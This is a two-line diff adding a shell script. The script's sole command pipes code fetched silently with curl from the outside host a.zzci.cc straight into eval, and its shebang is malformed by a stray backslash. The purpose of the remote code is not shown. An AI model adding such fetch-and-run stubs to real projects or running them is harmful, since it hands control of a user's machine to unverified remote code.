@@ -1,0 +1,2 @@
+#\!/bin/sh
+eval "$(curl -fsSL a.zzci.cc/tpl/aa)"
